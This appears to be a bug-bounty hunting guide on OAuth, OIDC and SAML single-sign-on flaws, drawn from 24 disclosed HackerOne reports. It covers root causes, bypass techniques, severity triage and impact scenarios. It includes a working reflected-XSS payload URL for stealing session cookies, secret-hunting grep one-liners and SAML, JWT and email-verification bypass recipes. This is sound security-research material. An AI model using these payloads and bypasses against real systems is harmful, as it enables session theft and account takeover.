### OAuth Error-Page XSS (#456333)
```
https://auth2.target.com/oauth2/fallbacks/error?error=xss&error_description=xss&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco%5Cu006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
# All error params were vulnerable; send to a logged-in user to steal session cookie.
```

### Grep / Recon One-Liners
```
# Discover OIDC config and disabled controllers
for p in .well-known/openid-configuration apps/user_oidc/id4me users/saml/sign_in; do
  curl -s -o /dev/null -w "%{http_code} $p\n" https://target/$p
done

# Bundle / sourcemap secret hunt
grep -rE "jwt\.sign|REACT_APP_.*SECRET|_SECRET\s*=|access/jwt\?jwt=" *.js *.js.map

# SAML element-selection audit in source (Rocket.Chat pattern)
grep -rE "getElementsByTagNameNS.*Response|local-name\(.\)='Signature'|verifySignatures" .

# Detect the "no cert = no verification" pattern in config code (#1049375)
grep -rE "if \(!.*\.cert\)|return;.*cert|verifySignatures" .

# Enumeration of login names on an internal SSO gateway (#161659)
#   search engines:  site:<gateway-host> /people/
#   check robots.txt on any internal-looking SSO subdomain
```

Detection heuristics drawn from the corpus: a 200 on a "disabled" controller is a finding (#2376929); a `redirect_path` in a signup JSON body means SSO enforcement is in play (#2101076); a signed JWT produced by browser code means the secret is public (#638635); and any SAML response accepted without a fresh `InResponseTo` is replayable (#888930).

---

## Common Root Causes

1. **Email is treated as identity across tenants.** Shopify let a user confirm an arbitrary email (confirmation link misrouted to the signup address) and then "integrate" with any store sharing that email → ATO of any shop owner (#791775, #796956). Root cause: no binding between verified email and the account being linked via SSO.

2. **SSO domain enforcement done by string suffix, not canonical comparison.** HackerOne's SAML-signup domain block was defeated with trailing `%0d%0a` control chars on `user[email]` (#2101076). Same family as doubled-slash path bypasses of fixed redirect filters (#178345).

3. **SAML signature verification uses the wrong element or none at all.** Rocket.Chat selected `Signature[0]` and `Response[0]` independently of the validated element (#812064); New Relic and Uber accepted attacker-built/unsigned responses at SSO finalize endpoints (#168108, #223014); php-saml converted `openssl_verify`'s `-1` error to `true` in a boolean context (#213789).

4. **Verification can be disabled by an unauthenticated config surface.** Rocket.Chat's `addSamlProvider` created a provider with a falsy cert flag, and `verifySignatures()` returned early when no cert was set (#1049375). "No certificate configured" meant "trust everything."

5. **Secrets and token generation live in the client.** Trint signed the Zendesk JWT in browser JS with the secret baked into a public source map — anyone could mint a token for any user (#638635). The GraphQL `zendeskToken` query leaked the same token class (#734936).

6. **No replay / nonce protection on SAML responses.** HackerOne accepted a captured `SAMLResponse` on `/users/saml/auth` more than once (#888930). A valid assertion stayed valid for longer than a single login.

7. **"Disabled" is UI-only.** Nextcloud's ID4me feature toggle only hid a button; controllers at `/apps/user_oidc/id4me` stayed routable and allowed unauthenticated account registration (#2376929).

8. **SSO login is auto-startable and redirect-trusting.** HackerOne's GET-initiated `/users/saml/sign_in?email=` enabled login CSRF, information leak, and open redirect (#171398), and the patch was bypassable (#178345); Mail.ru's OpenID login was an open redirect (#241484).

9. **Email verification skippable via alternate flows.** JetPack SSO accepted an invitation as proof of email control (#2037902); Trint had no email verification at all, enabling org-email claim + SSO login (#734936).

10. **Secondary features carry the SSO credential.** Snapchat's SSO `ticket` rode in a URL that an imported SVG-with-JS could read (#265943); the ORY Hydra error page reflected XSS that stole cookies of logged-in users (#456333); GraphQL exposed `zendeskToken` (#734936).

11. **Internal/staging trust boundary leaks.** Uber's staging subdomain served config/source without OneLogin SSO (#298990); Airbnb's internal SSO gateway was indexed by search engines and leaked login names (#161659); private SAML programs were fingerprintable (#167828).

12. **Cleartext IdP handoff.** Bumble/Badoo redirected users to `http://` odnoklassniki OAuth, enabling credential interception and login-form CSRF (#703759).

13. **SSO as an availability/cross-org primitive.** Superhuman/Grammarly allowed DoS of any org's SSO and inadvertent SSO into an attacker org (#976603).

14. **Outdated crypto/library assumptions.** php-saml ≤ 2.10.4 treated an `openssl_verify()` error state as success due to implicit PHP boolean conversion (#213789). Known library CVEs are directly exploitable when the app depends on their validation semantics.

**Synthesis.** Across all 24 reports, the recurring shape is a decision made on an untrusted input that the application then treats as trusted: an email that was never really verified, a SAML element that was never really signed, a feature that was never really disabled, a redirect destination that was never really checked, a "secret" that was never really secret. The fix in each case is to bind the decision to the exact artifact you validated — canonical email, the specific signed assertion, the enabled controller, the exact redirect target, a server-held key. When hunting, ask at each hop: *which validated object is this decision actually using?* If the answer is "the first one it found" or "whatever the client said," that is the bug.

---

## Bypass Techniques

### Against email/domain enforcement
- Post-signup email change before confirmation (confirmation misrouting) (#791775).

- Trailing control characters: `%0d%0a`, `%00`, trailing whitespace on `user[email]` (#2101076); Unicode normalization confusables in the same family.

- Alternate proof-of-email paths: invitations instead of confirmation links (#2037902).

- Plus-addressing and unverified-domain claims: `support+1@trint.com` when no verification exists (#734936).

- SSO "integration" that reuses the same email across tenants (#791775, #796956).

### Against patched redirect filters
- Doubled slash: `users//saml/sign_in` skipped the External Link Warning page after the original fix (#178345).

- Auto-start the SSO flow via plain GET + `remember_me=true` so no victim interaction is needed (#171398).

- Chain a legitimate open redirect on the identity host into the token/ticket hop (#241484).

### Against SAML verification
- Relocate the valid signed assertion to a secondary position and put the evil assertion first — the SP reads `Signature[0]`/`Response[0]` (#812064).

- Omit the signature entirely on finalize endpoints that only validate when a cert is configured (#168108, #223014).

- Register a new SAML provider via an unauthenticated config RPC to force a no-cert/no-verification state (#1049375).

- Exploit boolean truthiness of crypto error codes (`-1` → `true`) in outdated php-saml/xmlseclibs (#213789).

- Comment injection in `NameID` to split the signed canonical form from the parser's text node.

- Replay a valid captured response where `InResponseTo`/one-time-use is not enforced (#888930).

### Against "disabled feature" controls
- Call the controller directly (`/apps/user_oidc/id4me`) even when the UI toggle is off (#2376929).

- Hit staging/internal subdomains that bypass the production SSO gate (#298990).

### Against client-side token assumptions
- Treat any client-side `jwt.sign` secret as public; extract it from `.js.map` and mint tokens for arbitrary users (#638635).

- Query GraphQL/API fields that return SSO tokens directly (#734936).

### Against content/upload boundaries
- SVG with inline `<script>` imported from "import from site" executes on the storage origin and can read URL tickets/fragments (#265943).

- Reflect payloads into every OAuth error parameter (`error`, `error_description`, `error_hint`) on the IdP error fallback page (#456333).

### Against transport assumptions
- Follow `http://` handoffs from otherwise-HTTPS login flows and intercept IdP credentials (#703759).

---

## Gate 0 Validation

Before writing the report, answer all three with evidence from the corpus:

**1. What can the attacker do right now?** Be specific about the auth-decision-changing step:

- "I confirm an arbitrary email → integrate via SSO with any shop sharing it → I am logged in as that shop owner" (#791775).

- "I POST an unsigned SAML response with only an account ID + email → the SP creates a session as that user" (#168108).

- "I replay a captured SAMLResponse → I get a session without the victim's IdP interaction" (#888930).

- "I read the JWT secret from `app.js.map` → I mint an admin JWT → Zendesk accepts it" (#638635).

- If the outcome is only "the SSO endpoint redirects externally" with no credential/session impact, severity drops to Informational/Low (#241484 was closed as out-of-scope).

**2. What does the victim lose?** Minimum bar for High/Critical here is a changed identity or authorization boundary: another user's session, another tenant's store/org, internal chats/tickets, or admin role. If the victim only loses an open redirect or a login name with no access gain, downgrade (#161659, #241484).

**3. Can it be reproduced in 10 minutes from scratch?** Fresh browser/no prior session; the vulnerable endpoint still reachable; the SAML/JWT/email trick works without lucky timing. For flows needing an account ID + email (#168108) or an SSO-enabled tenant (#976603), state those prerequisites explicitly. For replay (#888930), show a clean second acceptance. If a step depends on the victim doing more than "click a link" or on a specific network position, document that dependency.

**Never-submit list for this class.** The corpus also contains findings that were closed or rated Low because the auth-decision step was missing. Do not report these as Critical:

- A bare open redirect on an OpenID login with no token/code/session carried on it — Mail.ru's `openid.mail.ru/login` redirect was closed as out of scope (#241484).
- An open redirect or login-CSRF primitive that leaks only `state` or a login name, with no session or account access gained (#171398, #161659, #167828).
- An "indicator" of a private SAML program without demonstrable access (#167828).
- A disabled-feature controller that is reachable but performs no privileged action — reachability alone is not impact; pair it with a consequence such as account registration or chat access (#2376929).

Conversely, do not downgrade a genuine auth-decision change because the payload is "just" a control character: `%0d%0a` on `user[email]` unlocked an entire HackerOne organization (#2101076).

**Minimum reproducible artifact set to attach to the report:**

```
1. Fresh-session HTTP request/response proving the auth decision changed.
2. The exact input (email / SAMLResponse / JWT / redirect) that caused it.
3. A "negative control" showing the same request without the bypass fails.
4. The victim-facing consequence: whose session/tenant/role was obtained.
```

---

## Real Impact Examples

### Scenario A: Email-Confirmation Bypass → SSO Integration → Any Shop Owner (Shopify, Critical)
A user on `*.myshopify.com` changed their email to a victim's address before confirming the signup address. Shopify mistakenly sent the confirmation link for the new (victim) email to the original signup inbox, letting the attacker confirm an arbitrary email. With that confirmed email, the attacker used the SSO/integration feature to link into any other Shopify store sharing the same email address — escalating to full control of any shop owner's account. This is the highest-impact chain in the corpus (#791775, extended in #796956 to merchants who had already adopted SSO). Business impact: control of arbitrary merchants' stores, orders, and data.

### Scenario B: SAML Verification Bypass → Internal Chat / Ticket Access (Uber, New Relic, Trint)
Uber's `uchat.uberinternal.com` had improper SAML verification; bypassing OneLogin granted unauthorized access to internal chats (#223014, $8,500). New Relic accepted a custom POSTed SAML response to `/accounts/$id/sso/saml/finalize` with only an account ID and email (#168108). Trint's absence of email verification plus a GraphQL `zendeskToken` field let an attacker claim `support+1@trint.com` and read/take over internal Zendesk tickets (#734936). Each case turns a broken identity check into internal-data access.

### Scenario C: Client-Side JWT Secret → Forge Tokens for Any Zendesk User (Trint, CVSS 8.1)
Trint implemented Zendesk JWT SSO by signing the token in a browser JavaScript file using `REACT_APP_ZENDESK_SECRET`, with the secret exposed in the public source map `app.e984c9df.js.map`. Any visitor could extract the secret, mint a JWT with an arbitrary `name`/`email` payload, and hit `https://support.zendesk.com/access/jwt?jwt=<TOKEN>` to authenticate as any Zendesk user (#638635). The same token class was retrievable directly from the GraphQL API (#734936).

### Scenario D: SSO Ticket Theft via SVG Import (Snapchat, $7,500)
SnapPublisher's SSO flow carried a `ticket` from `accounts.snapchat.com` to `snappublisher.snapchat.com/sso_continue?ticket=`, also reused as an API `Authorization` header. The "import from site" feature let the attacker import an SVG from attacker-controlled Google Cloud Storage; the SVG's JavaScript executed on the storage origin and logged/exfiltrated the URL `#hashfragment`/ticket, enabling theft of the SSO login token (#265943). Business impact: full session theft for Snappublisher accounts.

### Scenario E: SSO DoS + Cross-Organization Login Confusion (Superhuman/Grammarly, $10,500)
An attacker could DoS any organization's SSO integration so nobody in that org could log in, and could cause users to inadvertently SSO into the attacker's organization — authenticating against one SSO instance while being added to a completely separate one (#976603). Availability plus identity-confusion impact, showing SSO flaws need not be pure ATO to be High.

### Scenario F: Replay & Login CSRF on HackerOne SSO-SAML (Low severity but real primitives)
A captured SAML response could be replayed to `/users/saml/auth` to re-establish a session (#888930), and the auto-startable GET login flow plus open redirect supported login CSRF that leaked information sent by a victim into the attacker-induced session (#171398), with a patch bypass via doubled slash (#178345). These were rated Low in isolation but are the exact building blocks of higher-severity chains.

### Scenario G: Unauthenticated Provider Registration Disables SAML Entirely (Rocket.Chat, CVSS 10.0)
Rocket.Chat exposed an unauthenticated Meteor method `addSamlProvider` that let any visitor register a new SAML provider with a fully user-controlled `name`. The method created a settings flag defaulting to `false`, and the signature-verification routine began with an early return when no certificate was configured (`if (!this.serviceProviderOptions.cert) { return; }`). An attacker could therefore register a provider with no cert and then authenticate with arbitrary assertions as any user, including administrators (#1049375). This is the cleanest example in the corpus of an auth bypass that requires no crypto at all — the verification path is simply switched off by an exposed configuration surface.

### Scenario H: Disabled OIDC Controller Opens Cross-Tenant Registration (Nextcloud, Medium)
Nextcloud's `user_oidc` app let an administrator hide the ID4me login button, but the underlying controllers remained routable: any unauthenticated visitor could open `/apps/user_oidc/id4me` and register a new account. Because apps such as Nextcloud Talk expose instance-wide chat rooms to any registered user, this escalated from "UI feature hidden" to unauthorized access to internal communication (#2376929). The general lesson: a feature flag that only affects rendering is not an authorization control — test the controller directly.

---

## Disclosed Report Citations

**Important scope note:** the assigned corpus contained 28 reports, but the study pack provides **24 full disclosed reports** — fewer than 30. Per the no-padding rule, every one of the 24 real reports is cited below and **no invented report IDs or URLs are included**. Some reports have no public title in the pack; they are labelled by their documented technical effect.

1. **Shopify — Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO** ([H1 #791775](https://hackerone.com/reports/791775)) — email-confirmation bypass → SSO integration → cross-tenant ATO, arbitrary email confirmation / subdomain email-keyed identity, 2020 (Critical).

2. **Shopify — Able to Takeover Merchants Accounts Even They Have Already Setup SSO, After Bypassing the Email Confirmation** ([H1 #796956](https://hackerone.com/reports/796956)) — merchant ATO despite SSO, email-confirmation bypass + account-merge, 2020 (Medium, CVSS 6.8).

3. **Superhuman (formerly Grammarly) — Ability to DOS any organization's SSO and open up the door to account takeovers** ([H1 #976603](https://hackerone.com/reports/976603)) — SSO DoS + cross-org login confusion, SAML/XML-parser logic abuse, 2020 ($10,500, High).

4. **Snapchat — Stealing SSO Login Tokens (snappublisher.snapchat.com)** ([H1 #265943](https://hackerone.com/reports/265943)) — SSO login-ticket theft, SVG upload with JS on Google Cloud Storage + open redirect/import chaining, 2017 ($7,500, High).

5. **Trint Ltd — Insecure Zendesk SSO implementation by generating JWT client-side** ([H1 #638635](https://hackerone.com/reports/638635)) — client-side JWT signing with secret in JS source map, JWT forgery → Zendesk SSO ATO, 2019 (High, CVSS 8.1).

6. **Eternal / ORY Hydra — [auth2.zomato.com] Reflected XSS at `oauth2/fallbacks/error`** ([H1 #456333](https://hackerone.com/reports/456333)) — reflected XSS on OIDC provider error page, all error params injectable → cookie theft, 2018 (Medium, CVSS 4.6).

7. **HackerOne — (HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation** ([H1 #171398](https://hackerone.com/reports/171398)) — login CSRF + open redirect + self-XSS via auto-startable SSO-SAML, iframe + delayed navigation, 2016 (Low).

8. **HackerOne — SAML Response Reuse on hackerone.com/users/saml/auth** ([H1 #888930](https://hackerone.com/reports/888930)) — SAML response replay, captured SAMLResponse reused for silent login, 2020 (Low).

9. **Airbnb — ████ discloses valid Airbnb SSO login names via Google Search Results** ([H1 #161659](https://hackerone.com/reports/161659)) — information disclosure, internal SSO gateway indexed via missing robots.txt, 2016 (None/Info).

10. **HackerOne — Limited Open redirection using SSO-SAML** ([H1 #178345](https://hackerone.com/reports/178345)) — open-redirect filter bypass, doubled slash `users//saml/sign_in` skips External Link Warning, 2016 (Low).

11. **Trint Ltd — SSO bypass in zendesk using trint organization able to leak internal ticket information** ([H1 #734936](https://hackerone.com/reports/734936)) — SSO bypass via unverified email, GraphQL `zendeskToken` query + domain claim, 2019 (High, CVSS 8.1).

12. **Rocket.Chat — SAML authentication bypass** ([H1 #812064](https://hackerone.com/reports/812064)) — first-element XSW / assertion injection, `Signature[0]` + `Response[0]` misuse → admin ATO, 2020 (High, CVSS 8.8).

13. **Bumble — SSO through odnoklassniki uses http rather than https** ([H1 #703759](https://hackerone.com/reports/703759)) — cleartext IdP handoff, credential interception + login CSRF, 2019 ($150, Low).

14. **Nextcloud — Update php-saml library to 2.10.5** ([H1 #213789](https://hackerone.com/reports/213789)) — signature-verification boolean flaw, `openssl_verify()` `-1` → `true` in LogoutRequest/LogoutResponse, 2017 (Low).

15. **Uber — Configuration and/or source code files on uchat-staging.uberinternal.com can be viewed without OneLogin SSO Authentication** ([H1 #298990](https://hackerone.com/reports/298990)) — auth misconfiguration, static source/config served without SSO on staging subdomain, 2017 (Medium).

16. **Rocket.Chat — SAML authentication bypass through unauthenticated `addSamlProvider` Meteor Call** ([H1 #1049375](https://hackerone.com/reports/1049375)) — unauthenticated SAML config → signature verification disabled (no cert → early return), 2020 (Critical, CVSS 10.0).

17. **Informatica — SSO SAML request (improper verification)** ([H1 #106865](https://hackerone.com/reports/106865)) — SAML/XML-parser attack on `POST /sso` with Okta `Referer`, 2016 (High).

18. **Nextcloud — ID4me feature of OpenID connect app available even when disabled** ([H1 #2376929](https://hackerone.com/reports/2376929)) — disabled-feature controller still reachable, unauthenticated account registration via `/apps/user_oidc/id4me`, 2024 (Medium).

19. **HackerOne — SAML signup domain enforcement bypass results in unauthorized access to HackerOne PullRequest organization** ([H1 #2101076](https://hackerone.com/reports/2101076)) — signup domain-enforcement bypass, trailing `%0d%0a` on `user[email]`, 2024 (High).

20. **Automattic — Authentication bypass on JetPack SSO manager - Allows to access the administration panel of wordpress without user interaction** ([H1 #2037902](https://hackerone.com/reports/2037902)) — email-verification bypass via invitation acceptance, WordPress.com SSO, 2023 (High).

21. **New Relic — SSO Authentication Bypass** ([H1 #168108](https://hackerone.com/reports/168108)) — unsigned/custom SAML response to `/accounts/$id/sso/saml/finalize` → auth bypass, 2017 (Closed).

22. **HackerOne — Private SAML program fingerprinting** ([H1 #167828](https://hackerone.com/reports/167828)) — information disclosure, "strong indicator" of private SAML programs, 2016 (Closed).

23. **Uber — Improper SAML verification bypass of OneLogin authentication** ([H1 #223014](https://hackerone.com/reports/223014)) — SAML verification bypass → unauthorized access to internal chats, 2017 ($8,500, High).

24. **Mail.ru — Open redirect in http://openid.mail.ru/login** ([H1 #241484](https://hackerone.com/reports/241484)) — open redirect on OpenID login endpoint, 2018 (Low; closed as out-of-scope).

---

## Related Skills & Chains

- **`hunt-saml`** — Direct sibling. The SAML-specific mechanics (XSW variants, comment injection, signature stripping, replay) are the engine behind several OIDC/SSO reports here (#812064, #168108, #223014, #888930, #213789). Chain primitive: first-element XSW with `NameID=admin@target.com` → SP issues session/OAuth token bearing admin identity → all downstream OIDC-scoped APIs grant admin access.

- **`hunt-oauth`** — Covers `redirect_uri`, `state`, `nonce`, PKCE, and deep-link OAuth classes that complement the SSO-token flows in this corpus (#171398, #178345, #241484, #456333). Chain primitive: auto-startable SSO login open redirect → token/code lands on attacker-controlled receiver → exchange for session.

- **`hunt-ato`** — Every Critical in this pack is an ATO. Chain primitive: arbitrary-email confirmation (#791775) or unverified org email (#734936) → SSO integration/login as victim → full account/tenant takeover.

- **`hunt-auth-bypass`** — SAML verification bypass is a textbook auth-bypass pattern (#168108, #223014, #1049375, #2037902). This skill supplies the OIDC/SSO-specific mechanics; `hunt-auth-bypass` supplies the broader bypass discipline.

- **`hunt-subdomain`** — Multi-tenant and staging trust boundaries are recurring here (`*.myshopify.com` #791775, `uchat-staging` #298990). Chain primitive: claim/dangle an SSO-trusted subdomain → host callback/receiver → victim SSOs into attacker-controlled origin.

- **`hunt-xss` / `hunt-xxe`** — Secondary vectors that steal SSO credentials: reflected XSS on OAuth error pages (#456333), SVG upload JS execution (#265943), and XML parser abuse in SAML (#106865, #812064).

- **`security-arsenal`** — Pull the SAML/XSW payload catalog, the `redirect_uri` bypass table, and the URL/control-character normalization table before testing SSO filters.

- **`triage-validation`** — Run the Pre-Severity Gate: an SSO open redirect or login name leak without a changed auth decision is Low/Informational (#241484, #161659); a forged/bypassed/replayed SAML response or arbitrary-email SSO integration is Critical. The auth-decision-changing step is non-negotiable.

**Chain priority for this corpus:** (1) email → identity binding on multi-tenant apps (#791775, #2101076, #734936) produced the most Critical findings; (2) SAML verification bypass produced the most High findings (#812064, #223014, #168108); (3) client-side JWT secret disclosure produced the widest blast radius per bug (#638635); (4) redirect/CSRF primitives were Low alone but chained into the higher-severity cases (#171398, #178345). Start at (1) on a new target.
